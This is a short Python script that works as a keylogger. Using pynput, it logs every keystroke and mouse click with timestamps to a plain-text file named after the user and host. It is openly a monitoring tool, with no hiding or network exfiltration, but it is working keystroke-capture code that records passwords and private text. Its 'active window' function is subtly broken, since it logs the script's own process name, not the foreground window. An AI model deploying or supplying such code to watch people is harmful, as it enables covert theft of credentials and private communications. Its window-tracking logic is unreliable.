import os
import time
import logging
import getpass
import socket
import threading
from pynput import keyboard, mouse
from datetime import datetime
import psutil

#File path for log directory
LOG_DIR = r"ADD FILE PATH HERE"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)
    
# Log file setup
USER = getpass.getuser()
HOSTNAME = socket.gethostname()
LOG_FILE = f"{USER}_{HOSTNAME}_activity_log.txt"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key Pressed: {key}")

# Function to log mouse clicks
def on_click(x, y, button, pressed):
    action = "Pressed" if pressed else "Released"
    logging.info(f"Mouse {action} at ({x}, {y}) with {button}")

# Function to log active window changes
def log_active_window():
    last_window = None
    while True:
        try:
            current_window = psutil.Process(psutil.Process().pid).name()
            if current_window != last_window:
                logging.info(f"Active Window Changed: {current_window}")
                last_window = current_window
        except Exception as e:
            logging.info(f"Error in window detection: {e}")
        time.sleep(5)  # Check every 5 seconds

# Start keyboard listener
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Start mouse listener
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

# Start active window monitoring
window_thread = threading.Thread(target=log_active_window, daemon=True)
window_thread.start()

print(f"Logging started. Logs are being saved to {LOG_FILE}")

# Keep the script running
keyboard_listener.join()
mouse_listener.join()
